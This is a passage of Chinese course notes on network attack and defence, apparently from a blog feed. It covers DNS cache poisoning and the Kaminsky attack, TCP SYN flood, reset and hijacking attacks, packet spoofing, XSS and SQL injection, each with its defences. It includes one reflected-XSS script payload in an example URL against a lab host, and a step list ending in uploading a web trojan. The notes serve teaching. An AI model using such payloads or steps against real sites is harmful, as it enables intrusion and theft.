本地DNS缓存中毒攻击</h1><p>欺骗DNS回复（来自LAN）</p><img src="/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/11.11.png" class=""><p>目标：在看到来自本地DNS的查询后伪造DNS应答</p><h1>5 远程DNS缓存中毒攻击</h1><h2 id="5-1-概述">5.1 概述</h2><p><strong>挑战</strong>：对于与本地DNS服务器不在同一网络上的远程攻击者，欺骗回复要困难得多，因为他们需要猜测查询数据包使用的两个随机数：</p><ul><li>源端口号（16位随机数）</li><li>事务ID（16位随机数）</li></ul><p><strong>缓存效果</strong>：如果一次尝试失败，local DNS 将缓存实际回复；攻击者需要等待缓存超时以进行下一次尝试。</p><h2 id="5-2-Kaminsky攻击">5.2 Kaminsky攻击</h2><h3 id="5-2-1-概述">5.2.1 概述</h3><p>如何在不担心缓存效应的情况下不断伪造回复？</p><p>卡明斯基的想法：每次询问不同的问题，因此缓存答案并不重要，并且本地DNS服务器每次都会发送一个新的查询。在<u>授权部分</u>提供伪造答案</p><img src="/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/11.12.png" class=""><h3 id="5-2-2-Kaminsky攻击：一个示例响应">5.2.2 Kaminsky攻击：一个示例响应</h3><img src="/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/11.13.png" class=""><ul><li>QUESTION SECTION部分的<code>twysw.example.com</code>是一个随机生成的名称，会随着每次攻击尝试而更改。</li><li>ANSER SECTION部分的回应并不重要</li><li>AUTHORITY SECTION部分的内容是我们希望本地DNS服务器缓存的内容，它告诉DNS服务器使用<code>ns.attacker32.com</code>作为<code>example.com</code>域的名称服务器</li></ul><p><strong>IP和UDP头</strong></p><img src="/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/11.14.png" class=""><p><strong>DNS Header和有效载荷</strong></p><img src="/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/11.15.png" class=""><h1>6 来自恶意DNS服务器的回复伪造攻击</h1><p>当用户访问网站（<a href="http://xn--attacker32-lv8r.com">如attacker32.com</a>）时，DNS查询最终将到达attacker32.com域的权威名称服务器。除了在响应的应答部分提供IP地址外，DNS服务器还可以在授权和其他部分提供信息。攻击者可以使用这些部分提供欺诈信息。</p><p><strong>附加部分的假数据</strong></p><img src="/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/11.16.png" class=""><p>ADDITIONAL SECTION部分的数据超出区域，会被丢弃。如果不丢弃，它们将导致安全问题。</p><p><strong>权限部分的假数据</strong></p><img src="/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/11.17.png" class=""><p>AUTHORITY SECTION部分中<code>example.net</code>是被允许的，而<code>facebook.com</code>是不被允许的，因为它超出了区域，应该被丢弃。</p><p><strong>来自恶意DNS服务器的回复伪造攻击</strong></p><img src="/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/11.19.png" class=""><p>AUTHORITY SECTION部分中<code>www.facebook.com</code>被允许的.</p><p>ADDITIONAL SECTION部分的<code>www.facebook.com</code>不被允许（区域外）。本地DNS服务器将自行获取此主机名的IP地址。</p><p><strong>反向DNS查找中的应答伪造</strong></p><p>例子：给定IP地址128.230.171.184，DNS解析器构造一个“假名称”184.171.230.128.in-addr.arpa，然后通过迭代过程发送查询。在dig命令中使用@option模拟整个反向查找过程。</p><ol><li><p>询问根服务器。得到in-addr.arpa区域的名称服务器。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">dig</span> <span class="hljs-variable">@a</span>.root-servers.net -x <span class="hljs-number">128.230.171.184</span><br></code></pre></td></tr></table></figure><img src="/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/11.20.png" class=""></li><li><p>询问in-addr.arpa区域的名称服务器。为128.in-addr.arpa区域提供名称服务器。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">dig</span> <span class="hljs-variable">@f</span>.in-addr-servers.arpa -x <span class="hljs-number">128.230.171.184</span><br></code></pre></td></tr></table></figure><img src="/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/11.21.png" class=""></li><li><p>询问128.in-appr.arpa区域的名称服务器。得到203.128.in-addr.arpa区域的名称服务器。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">dig</span> <span class="hljs-variable">@r</span>.arin.net -x <span class="hljs-number">128.230.171.184</span><br></code></pre></td></tr></table></figure><img src="/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/11.22.png" class=""></li><li><p>询问230.128.in-appr.arpa区域的名称服务器。得到了最终结果。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">dig</span> <span class="hljs-variable">@ns2</span>.syr.edu -x <span class="hljs-number">128.230.171.184</span><br></code></pre></td></tr></table></figure><img src="/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/11.23.png" class=""></li></ol><p><strong>问题</strong></p><p>可以使用从反向DNS查找获得的主机名作为访问控制的基础吗？</p><p><strong>回答</strong></p><p>如果数据包来自攻击者，则反向DNS查找将返回到攻击者的名称服务器。攻击者可以使用他们想要的任何主机名进行回复。</p><h1>7 防止DNS缓存中毒攻击</h1><h2 id="7-1-DNSSEC">7.1 DNSSEC</h2><ul><li>DNSSEC是DNS的一组扩展，旨在对DNS数据提供身份验证和完整性检查。</li><li>使用DNSSEC，来自DNSSEC保护区的所有答案都经过数字签名。</li><li>通过检查数字签名，DNS解析器能够检查信息是否真实。</li><li>DNS缓存中毒将被此机制击败，因为将检测到任何虚假数据，因为它们将无法通过签名检查。</li></ul><img src="/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/11.24.png" class=""><h2 id="7-2-使用TLS-SSL进行保护">7.2 使用TLS/SSL进行保护</h2><ul><li>传输层安全（TLS/SSL）协议提供了针对缓存中毒攻击的解决方案。</li><li>在使用DNS协议获取域名（<a href="http://www.example.net">www.example.net</a>）的IP地址后，计算机将询问IP地址的所有者（服务器）<a href="http://xn--www-c88dt4yq92a.example.net">是否为www.example.net</a>。</li><li>服务器必须提供由受信任实体签名的公钥证书，并证明它知道与www.example.net关联的相应私钥（即，它是证书的所有者）。</li><li>HTTPS构建在TLS/SSL之上。它可以击败DNS缓存中毒攻击。</li></ul><h2 id="7-3-DNSSEC与TLS-SSL比较">7.3 DNSSEC与TLS/SSL比较</h2><ul><li>DNSSEC和TLS/SSL都基于公钥技术，但它们的信任链不同。</li><li>DNSSEC使用DNS区域层次结构提供信任链，因此<strong>父区域中的名称服务器</strong>为子区域中的名称服务器提供担保。</li><li>TLS/SSL依赖于<strong>公钥基础设施</strong>，该基础设施包含为其他计算机提供担保的证书颁发机构。</li></ul><h1>8 DNS重新绑定攻击</h1><img src="/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/11.26.jpg" class=""><img src="/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/11.27.png" class=""><h1>9 DNS服务器上的拒绝服务攻击</h1><h2 id="9-1-对根服务器和TLD服务器的攻击">9.1 对根服务器和TLD服务器的攻击</h2><ul><li><p>根名称服务器：如果攻击者能够关闭根区域的服务器，则可以关闭整个Internet。但是，攻击根服务器很困难：</p><ul><li><p>根名称服务器是高度分布式的。有13（A，B……M）个根名称服务器（服务器场），由大量冗余计算机组成，以提供可靠的服务。</p><p>（同一个根域名服务器部署在不同大洲的多个地点。通过IP anycast技术实现请求时，其中一个服务器就会接受并回复。这项技术使用边界网关协议（BGP）。在多个不同地点 同时广播同一个目标IP地址，BGP路由器会从中选择一个来实现路由目的。）</p></li><li><p>由于TLD的名称服务器通常缓存在本地DNS服务器中，因此在缓存过期（48小时）之前不需要查询根服务器。（一旦获得顶级域名服务器ip地址，接下来再请求就不是从root服务器开始了）对根服务器的攻击必须持续很长时间才能看到显著效果。</p></li></ul></li><li><p>TLD的名称服务器更容易受到攻击。TLD（如gov、com、net等）具有相当强的抵御DOS攻击的基础设施。但某些不太有名的TLD（如国家代码TLD）没有足够的框架结构。因此，攻击者可以关闭目标国家的互联网。</p></li></ul><h2 id="9-2-对特定域的名称服务器的攻击">9.2 对特定域的名称服务器的攻击</h2><p>案件：</p><p>1、UltraDNS是许多主要电子商务公司的DNS提供商，如亚马逊、沃尔玛、Expedia。2004年，针对该提供商的DOS启动，该服务中断了一个小时。</p><p>2、Dyn网络：2016年，针对CNN、BBC、HBO、PayPaletc等公司的一家主要DNS服务提供商发起了多起攻击。这些攻击被认为是通过僵尸网络发起的，僵尸网络由不同的设备组成，如IP摄像机、婴儿监视器等。这导致了主要的互联网服务不可用。</p><p>3、DNSPod：2009年，一家中国域名服务提供商的多个DNS服务器遭到DDoS攻击。此次攻击的目标是一家在中国广受欢迎的视频流媒体网站（<a href="http://Baofeng.com">Baofeng.com</a>）。攻击的第二天，当其他服务器先前缓存的DNS响应超时时，用户机器上的暴风媒体播放器因攻击而无法找到服务器的IP地址。由于媒体播放器软件中的缺陷，他们没有等待，而是以更快的速度连续发送DNS查询。由于大量的DNS查询，导致中国电信（ISP）网络充斥和拥塞。它影响了20个省份，被称为中国最严重的互联网事件。</p>]]></content>
    
    
    <categories>
      
      <category>网络攻防课程实验</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>假消息攻-TCP攻击</title>
    <link href="/2024/02/20/10_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB_TCP%E6%94%BB%E5%87%BB/"/>
    <url>/2024/02/20/10_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB_TCP%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1>1 TCP协议</h1><ul><li>传输控制协议（TCP）是Internet协议套件的核心协议。</li><li>位于IP层的顶部；传输层。</li><li>为应用程序提供<u>主机到主机</u>的通信服务。</li><li>两个传输层协议<ul><li>TCP：在应用程序之间提供可靠且有序的通信通道。</li><li>UDP：具有较低开销的轻量级协议，可用于不需要可靠性或通信顺序的应用程序。</li></ul></li></ul><h1>2 TCP服务器程序</h1><ul><li><p>步骤1：创建一个套接字。与客户端程序相同。</p></li><li><p>步骤2：绑定到端口号。</p><p>通过网络与其他人通信的应用程序需要在其主机上注册端口号。当数据包到达时，操作系统根据端口号知道哪个应用程序是接收器。服务器需要告诉操作系统它正在使用哪个端口。这是通过bind（）系统调用完成的</p></li><li><p>步骤3：侦听连接。</p><ul><li>设置套接字后，TCP程序调用listen（）以等待连接。</li><li>它告诉系统它已准备好接收连接请求。</li><li>一旦收到连接请求，操作系统将通过三方握手建立连接。</li><li>已建立的连接放置在队列中，等待应用程序接收它。第二个参数给出了可以存储在队列中的连接数（linux kernel 2.2以后）。</li></ul></li><li><p>步骤4：接收连接请求建立连接后，应用程序需要“接收”连接才能访问它。accept（）系统调用从队列中提取第一个连接请求，创建一个新套接字，并返回引用该套接字的文件描述符。</p></li><li><p>步骤5：发送和接收数据一旦建立并接受了连接，双方都可以使用这个新的套接字发送和接收数据。</p></li></ul><h1>3 数据传输</h1><ul><li>一旦建立连接，操作系统在每一端分配两个缓冲区，一个用于发送数据（发送缓冲区）和接收缓冲区（接收缓冲区）。</li><li>当应用程序需要发送数据时，它会将数据放入TCP发送缓冲区。</li><li>发送缓冲区中的每个字节（8bit）在报头中都有一个序列号字段，用于指示数据包的序列。在接收端，这些序列号用于将数据放置在接收缓冲区内的正确位置。</li><li>一旦数据被放入接收缓冲区，它们就被合并到一个数据流中。</li><li>应用程序从接收缓冲区读取数据。如果没有可用的数据，它通常会被锁定。当有足够的数据可读取时，它将被解除阻止。</li><li>接收方使用确认包通知发送方接收的数据。</li></ul><h1>4 SYN Flooding攻击</h1><h2 id="4-1-概述">4.1 概述</h2><p><strong>想法</strong>：为了填充存储半开放连接的队列，以便没有空间为任何新的半开放连接存储TCB，基本上服务器不能接受任何新的SYN数据包。</p><p><strong>实现这一点的步骤</strong>：持续向服务器发送大量SYN数据包。这会通过插入TCB记录来消耗队列中的空间。</p><ul><li>不要完成握手的第三步，因为这将使TCB记录出列。</li><li>当向服务器发送SYN数据包时，我们需要使用随机源IP地址；否则，攻击可能会被防火墙阻止。</li><li>服务器发送的SYN+ACK数据包可能会被丢弃，因为伪造的IP地址可能不会分配给任何机器。如果到达现有机器，RST包将被发送，TCB将被平衡。</li><li>由于第二种选择不太可能发生，TCB记录将大部分保留在队列中。这导致了SYN Flooding攻击。</li></ul><p><strong>TCP状态</strong></p><ul><li>LISTEN：等待TCP连接。</li><li>ESTABLISHED：完成三次握手</li><li>SYN_RECV：半开放式连接</li></ul><p><strong>结果</strong></p><ul><li>使用netstat命令，我们可以看到在端口23上有大量半开放的连接，带有随机源IP。</li><li>使用top命令，我们可以看到服务器上的<u>CPU使用率不高</u>。<u>服务器处于活动状态</u>，可以正常执行其他功能，但不能仅接受telnet连接。</li></ul><h2 id="4-2-对策：syn-cookies">4.2 对策：syn cookies</h2><ul><li>在服务器接收到SYN数据包后，它使用只有服务器知道的密钥从数据包中的信息计算密钥散列（H）。</li><li>此哈希（H）作为初始序列号从服务器发送到客户端。H称为SYN cookie。</li><li>服务器不会将半开放连接存储在其队列中。</li><li>如果客户端是攻击者，H将无法到达攻击者。如果客户端不是攻击者，则在确认字段中输入H+1。</li><li>服务器通过重新计算cookie来检查确认字段中的数字是否有效。</li></ul><h1>5 TCP重置攻击</h1><ul><li><p>断开TCP连接</p><img src="/2024/02/20/10_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB_TCP%E6%94%BB%E5%87%BB/10.1.png" class=""><ul><li>A向B发送一个“FIN”数据包。</li><li>B用“ACK”数据包进行回复。这使A与B交流更加接近。</li><li>现在，B向a发送一个“FIN”数据包，a回复“ACK”。</li></ul></li><li><p>使用重置标志：</p><ul><li>通信一方发送RST包则立即断开连接。</li></ul></li></ul><p><strong>目标</strong>：断开A和B之间的TCP连接</p><h2 id="5-1-SSH连接上的TCP重置攻击">5.1 SSH连接上的TCP重置攻击</h2><ul><li>如果加密是在网络层完成的，则包括包头在内的整个TCP数据包都将被加密，这使得嗅探或欺骗变得不可能。</li><li>但由于SSH在<strong>传输层</strong>进行加密，<strong>TCP包头仍然未加密</strong>。因此，攻击是成功的，因为RST数据包只需要包头。</li></ul><h1>6 TCP会话劫持攻击</h1><p><strong>目标</strong>：在已建立连接中注入数据。</p><h2 id="6-1-创建反向shell">6.1 创建反向shell</h2><ul><li>劫持连接后运行的最佳命令是运行反向shell命令。</li><li>在服务器上运行shell程序，如/bin/bash，并使用可由攻击者控制的输入/输出设备。</li><li>shell程序使用TCP连接的一端作为其输入/输出，连接的另一端由攻击者计算机控制。</li><li>反向 shell是一个在远程计算机上运行的shell进程，可连接回攻击者。</li><li>这是一种非常常见的黑客技术。</li></ul><img src="/2024/02/20/10_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB_TCP%E6%94%BB%E5%87%BB/10.2.jpg" class=""><h2 id="6-2-防御会话劫持">6.2 防御会话劫持</h2><ul><li>使攻击者难以伪造数据包<ul><li>随机化源端口号</li><li>随机化初始序列号</li><li>对本地攻击无效</li></ul></li><li>加密有效载荷</li></ul>]]></content>
    
    
    <categories>
      
      <category>网络攻防课程实验</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>假消息攻击-包嗅探与欺骗</title>
    <link href="/2024/02/20/9_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB_%E5%8C%85%E5%97%85%E6%8E%A2%E4%B8%8E%E6%AC%BA%E9%AA%97/"/>
    <url>/2024/02/20/9_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB_%E5%8C%85%E5%97%85%E6%8E%A2%E4%B8%8E%E6%AC%BA%E9%AA%97/</url>
    
    <content type="html"><![CDATA[<h1>1 如何接收数据包</h1><ul><li>NIC（网络接口卡）是机器和网络之间的物理或逻辑链路</li><li>每个NIC都有一个MAC地址</li><li>网络上的每个NIC都将“听”到线路上的所有帧</li><li>NIC检查每个数据包的目标地址，如果该地址与卡的MAC地址匹配，则会进一步复制到内核的缓冲区中</li></ul><h1>2 混杂模式</h1><ul><li>未指定给定NIC的帧将被丢弃</li><li>在混杂模式下运行时，NIC将<u>从网络接收到的每个帧</u>传递给内核</li><li>如果嗅探器程序在内核中注册，它将能够看到所有包</li><li>在Wi-Fi中，它被称为监控（monitor）模式</li></ul><h1>3 BSD数据包过滤器（BPF）</h1><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">setsockopt(<span class="hljs-name">sock</span>, SOL_SOCKET, SO_ATTACH_FILTER, <span class="hljs-symbol">&amp;bpf</span>, sizeof(<span class="hljs-name">bpf</span>))<br></code></pre></td></tr></table></figure><ul><li>编译的BPF伪代码可以通过setsockopt（）附加到套接字</li><li>当内核接收到数据包时，BPF将被调用</li><li>一个被接收的数据包被提交到上层协议栈。</li></ul><h1>4 带/不带过滤器的数据包流</h1><h1>5 包嗅探</h1><h2 id="5-1-协议头和协议层的对应关系">5.1 协议头和协议层的对应关系</h2><h2 id="5-2-主机封包">5.2 主机封包</h2><h2 id="5-3-嗅探器组包">5.3 嗅探器组包</h2><h2 id="5-4-数据包欺骗">5.4 数据包欺骗</h2><p>当数据包中的某些关键信息被伪造时，我们称之为数据包欺骗。</p><p><strong>过程（以UDP为例）</strong></p><ul><li>使用PCAP API捕获感兴趣的数据包</li><li>从Captured Package中复制一份</li><li>用新消息替换UDP数据字段，并交换源和目标字段</li><li>发出欺骗的答复</li></ul>]]></content>
    
    
    <categories>
      
      <category>网络攻防课程实验</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>web应用攻击</title>
    <link href="/2024/02/20/7%E3%80%818_web%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB/"/>
    <url>/2024/02/20/7%E3%80%818_web%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1>1 Web应用基础</h1><h2 id="1-1-URL">1.1 URL</h2><p>Uniform Resource Locator，统一资源定位符,指定Web网页的在互联网的位置.</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">http:</span>//&lt;user&gt;<span class="hljs-symbol">:&lt;password&gt;</span>@&lt;host&gt;<span class="hljs-symbol">:&lt;port&gt;/&lt;path&gt;</span>?&lt;query&gt;<span class="hljs-comment">#&lt;frag&gt;</span><br></code></pre></td></tr></table></figure><ul><li>http://  字段指明采用HTTP协议访问Web网页；</li><li>&lt;user&gt;: &lt;password&gt;字段指定访问Web服务器所需要的用户名和口令；</li><li>&lt;host&gt;字段指明Web服务器的域名或IP地址；</li><li>&lt;port&gt;字段指明Web服务器的访问端口;</li><li>&lt;path&gt;指定Web网页在Web服务器上的访问路径；</li><li>&lt;query&gt;指定查询所附带字段；</li><li>&lt;frag&gt;指定Web网页中特定的片段。</li></ul><h2 id="1-2-Web网页">1.2 Web网页</h2><ul><li><p>静态网页</p><p>静态网页是指内容固定，不会根据Web客户端请求的不同而改变的Web网页</p></li><li><p>动态网页</p><p>动态网页是相对于静态网页而言的，是指内容会根据时间、环境或用户输入的不同而改变的Web网页</p></li></ul><p><strong>Web服务器-主流Web服务器</strong>：Apache、IIS、Tomcat、Nginx</p><h2 id="1-3-Web应用攻击类型">1.3 Web应用攻击类型</h2><ul><li><p>Web客户端攻击（攻击用户）</p><p>跨站脚本攻击（Cross-Site Scripting，简称XSS攻击）、网络钓鱼和网页挂马</p></li><li><p>Web服务器攻击</p><p>网页篡改、代码注入攻击、文件操作控制攻击等</p><p>HTTP头注入攻击、HTTP会话攻击等</p></li></ul><h1>2 XSS攻击</h1><h2 id="2-1-概念">2.1 概念</h2><ul><li>跨站脚本攻击（Cross-Site Scripting，简称XSS攻击）出现在上世纪90年代中，由于跨站脚本攻击的缩写和层叠样式表（Cascading Style Sheets，CSS）的缩写一样，为了防止混淆，故缩写成XSS攻击。</li><li>XSS攻击是由于Web应用程序对用户输入过滤不足而产生的，使得攻击者输入的特定数据变成了JavaScript脚本或HTML代码</li></ul><h2 id="2-2-同源策略">2.2 同源策略</h2><p>它的含义是指，A网页设置的 Cookie，B网页不能打开，除非这两个网页&quot;同源&quot;。所谓&quot;同源&quot;指的是&quot;三个相同&quot;。</p><h2 id="2-3-XSS流行的原因">2.3 XSS流行的原因</h2><ul><li>web浏览器本身设计是不安全的；</li><li>输入和输出是web应用程序最基本的交互，过程中没有很好的安全防护；</li><li>团队合作开发，人员安全素质参差不齐；</li><li>开发人员没有XSS漏洞意识；</li><li>触发XSS攻击的方式非常简单，防御困难；</li><li>web2.0的流行，提供了XSS更多的表演平台。</li></ul><h2 id="2-4-XSS漏洞的危害">2.4 XSS漏洞的危害</h2><p>(1)网络钓鱼，包括盗取各类用户账号</p><p>(2)窃取用户cookies资料，从而获取用户隐私信息，或利用好用户身份进行一部对网站执行操作</p><p>(3)劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、强制发表日志、发送电子邮件等</p><p>(4)强制弹出广告页面、刷流量等；</p><p>(5)网页挂马</p><p>(6)进行恶意操作，例如任意篡改页面信息、删除文章等；</p><p>(7)进行大量的客户端攻击，如DDoS攻击；</p><p>(8)提取客户端信息，例如用户的浏览历史、真实IP、开放端口等；</p><p>(9)控制受害者机器向其它网站发起攻击；</p><p>(10)结合其他漏洞，如CSRF漏洞，实施进一步作恶；</p><p>(11)提升用户权限，包括进一步渗透网站；</p><p>(12)传播跨站脚本蠕虫；…</p><h2 id="2-5-XSS类型">2.5 XSS类型</h2><h3 id="2-5-1-反射型XSS">2.5.1 反射型XSS</h3><p><strong>概念</strong></p><ul><li><p>非持久性、参数型跨站脚本</p></li><li><p>恶意脚本附加到URL地址参数中</p></li><li><p>如：<code>http://192.168.220.128/dvwa/vulnerabilities/xss_r/?name=&lt;script&gt; alert(/xss/)&lt;/script&gt;</code></p></li></ul><p><strong>工作流程</strong></p><h3 id="2-5-2-存储型XSS">2.5.2 存储型XSS</h3><p><strong>概念</strong></p><ul><li>持久型</li><li>一般攻击存在留言、评论、博客日志等中</li><li>恶意脚本被存储在服务端的数据库中</li></ul><p><strong>工作流程</strong></p><h3 id="2-5-3-DOM型XSS">2.5.3 DOM型XSS</h3><p><strong>概念</strong></p><ul><li><p>DOM XSS是基于在js上的</p></li><li><p>不需要与服务端进行交互</p></li><li><p>网站有一个HTML页面采用不安全的方式：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-built_in">document</span>.location<br><span class="hljs-built_in">document</span>.URL<br><span class="hljs-built_in">document</span>.URLUnencoded<br><span class="hljs-built_in">document</span>.referrer<br><span class="hljs-built_in">window</span>.location<br></code></pre></td></tr></table></figure></li></ul><p><strong>工作方式</strong></p><h2 id="2-6-XSS攻击">2.6 XSS攻击</h2><h3 id="2-6-1-会话劫持">2.6.1 会话劫持</h3><ul><li>会话ID由Web客户端提供给服务器以表示同一个会话，一般采用Cookie方式或URL方式传递。会话数据则一般保存在Web服务器，用于Web应用程序之间信息传递。</li><li>会话劫持是指攻击者通过利用XSS攻击，冒用合法者的<strong>会话ID</strong>进行网络访问的一种攻击方式。</li></ul><h3 id="2-6-2-网络钓鱼">2.6.2 网络钓鱼</h3><ul><li>攻击者可以执行JavaScript代码动态生成网页内容或直接注入HTML代码，从而产生网络钓鱼攻击。</li><li>和传统的网络钓鱼攻击相比而言，通过XSS攻击实施网络钓鱼具有更强的隐蔽性。</li></ul><h3 id="2-6-3-信息刺探">2.6.3 信息刺探</h3><p>利用XSS攻击，可以在客户端执行一段JavaScript代码，因此：</p><ul><li>攻击者可以通过这段代码实现多种信息的刺探</li><li>访问历史信息、端口信息、剪贴板内容、客户端IP地址、键盘信息等。</li></ul><h3 id="2-6-4-网页挂马">2.6.4 网页挂马</h3><ul><li>将Web网页技术和木马技术结合起来就是网页挂马。</li><li>攻击者将恶意脚本隐藏在Web网页中，当用户浏览该网页时，这些隐藏的恶意脚本将在用户不知情的情况下执行，下载并启动木马程序。</li></ul><h3 id="2-6-5-XSS蠕虫">2.6.5 XSS蠕虫</h3><ul><li>XSS蠕虫是指利用XSS攻击进行传播的一类恶意代码；</li><li>一般利用<strong>存储型</strong>XSS攻击；</li><li>XSS蠕虫的基本原理就是将一段JavaScript代码保存在服务器上，其他用户浏览相关信息时，会执行JavaScript代码，从而引发攻击。</li></ul><h2 id="2-7-XSS防范措施">2.7 XSS防范措施</h2><h3 id="2-7-1-HttpOnly属性">2.7.1 HttpOnly属性</h3><p>HttpOnly是另一个应用给cookie的标志，而且所有现代浏览器都支持它。HttpOnly标志的用途是指示浏览器禁止任何脚本访问cookie内容，这样就可以降低通过JavaScript发起的XSS攻击偷取cookie的风险。</p><h3 id="2-7-2-安全编码">2.7.2 安全编码</h3><p>PHP语言中针对XSS攻击的安全编码函数有htmlentities和htmlspecialchars等，这些函数对特殊字符的安全编码方式如下：小于号（&lt;）转换成&amp;lt、大于号（&gt;）转换成&amp;gt、与符号（&amp;）转换成&amp;amp、双引号（&quot;）转换成&amp;quot、单引号（'）转换成&amp;#39。</p><h1>3 SQL注入攻击</h1><h2 id="3-1-概念">3.1 概念</h2><p>就是向网站提交精心构造的SQL查询语句，导致网站将关键数据信息返回</p><h2 id="3-2-SQL注入攻击类型">3.2 SQL注入攻击类型</h2><p>字符型SQL注入、数字型SQL注入、基于错误信息SQL注入、SQL盲注入</p><h2 id="3-3-注入步骤">3.3 注入步骤</h2><ol><li>注入点的发现</li><li>数据库的类型</li><li>猜解表名</li><li>猜解字段名</li><li>猜解内容</li><li>进入管理页面，上传ASP木马</li></ol><h2 id="3-4-SQL注入的危害">3.4 SQL注入的危害</h2><ul><li>读取、修改或者删除数据库内的数据，获取数据库中的用户名和密码等敏感信息</li><li>获得数据库管理员的权限</li><li>如果能够再利用SQL Server扩展存储过程和自定义扩展存储过程来执行一些系统命令，攻击者还可以获得该系统的控制权</li><li>SQL注入的隐蔽性：SQL注入是从正常的WWW端口访问，防火墙一般不报警，很难发现</li></ul><h2 id="3-5-爆库">3.5 爆库</h2><p><strong>概念</strong></p><p>通过一些技术手段或者程序漏洞得到数据库的地址，并将数据非法下载到本地</p><p><strong>什么导致了黑客可以成功暴库</strong></p><ul><li>网站制作者的偷懒</li><li>IE与ASP程序对特殊字符”\”解析的不同</li></ul><p><strong>暴库手段</strong>：Google hack、%5c暴库</p><h2 id="3-6-防范措施">3.6 防范措施</h2><p>特殊字符转义、输入验证和过滤、参数化方法</p><h1>4 HTTP会话攻击及防御</h1><ul><li>HTTP协议设计之初没有考虑到会话问题，而现在的Web应用几乎都包含会话；</li><li>后来增加的会话管理机制存在天生不足，并一直伴随着HTTP会话管理技术的发展而不断变化更新；</li><li>比较经典的HTTP会话攻击技术有预测会话ID、窃取会话ID、控制会话ID、跨站请求伪造攻击（Cross-Site Request Forgery，CSRF）等。</li></ul><h2 id="4-1-HTTP会话原理">4.1 HTTP会话原理</h2><p><strong>示例</strong></p><h2 id="4-2-HTTP会话攻击">4.2 HTTP会话攻击</h2><p>预测会话ID、窃取会话ID、控制会话ID</p><p><strong>CSRF攻击</strong></p><h2 id="4-3-防御">4.3 防御</h2><h3 id="4-3-1-针对预测会话ID号攻击">4.3.1 针对预测会话ID号攻击</h3><p>通常开发者自己实现会话管理机制时，较容易出现会话ID被预测的问题。因此，为防范预测会话ID号攻击，建议<strong>采用编程语言内置的会话管理机制</strong>，如PHP语言、JAVA语言的会话管理机制等</p><h3 id="4-3-2-针对窃取会话ID号攻击">4.3.2 针对窃取会话ID号攻击</h3><p>需要根据不同的窃取会话ID号方法，采取不同的防范措施，如基于XSS攻击实施的会话ID号窃取攻击，可以采用<strong>HttpOnly</strong>属性的方法来防范</p><h3 id="4-3-3-针对会话ID固定攻击">4.3.3 针对会话ID固定攻击</h3><p>支持会话采纳（Session Adoption）的Web环境，存在会话ID号固定的风险比较高。因此，尽可能的采用非会话采纳的Web环境或对会话采纳方式进行防范。</p><h3 id="4-3-4-针对会话保持攻击">4.3.4 